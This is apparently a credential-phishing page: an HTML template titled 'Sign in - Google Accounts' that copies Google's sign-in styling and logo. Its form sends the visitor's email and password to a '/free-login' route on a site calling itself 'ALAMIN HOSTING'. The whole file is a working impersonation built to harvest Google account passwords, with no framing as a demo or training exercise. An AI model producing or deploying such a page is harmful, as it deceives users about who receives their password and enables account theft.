<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Roboto', Arial, sans-serif; }
        body { background: #f0f4f9; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-box { background: #fff; padding: 40px; border-radius: 8px; width: 100%; max-width: 450px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border: 1px solid #dadce0; }
        .google-logo { text-align: center; margin-bottom: 20px; }
        .google-logo img { width: 80px; }
        h1 { font-size: 24px; color: #202124; text-align: center; margin-bottom: 10px; font-weight: 400; }
        p { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 30px; }
        .input-group { position: relative; margin-bottom: 25px; }
        .input-group input { width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: 0.2s; }
        .input-group input:focus { border-color: #1a73e8; box-shadow: inset 0 0 0 1px #1a73e8; }
        .buttons { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .btn-google { background: #1a73e8; color: #fff; padding: 10px 24px; border-radius: 4px; border: none; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; }
        .btn-google:hover { background: #1557b0; }
        .link { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
        .link:hover { text-decoration: underline; }
        .error { color: #d93025; font-size: 13px; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="login-box">
    <div class="google-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
    </div>
    <h1>Sign in</h1>
    <p>to continue to ALAMIN HOSTING</p>

    {% if error %}
    <div class="error">{{ error }}</div>
    {% endif %}

    <form method="POST" action="/free-login">
        <div class="input-group">
            <input type="email" name="email" placeholder="Email or phone" required>
        </div>
        <div class="input-group">
            <input type="password" name="password" placeholder="Enter your password" required>
        </div>
        <div class="buttons">
            <a href="/" class="link">Forgot email?</a>
            <button type="submit" class="btn-google">Next</button>
        </div>
    </form>
</div>

</body>
</html>
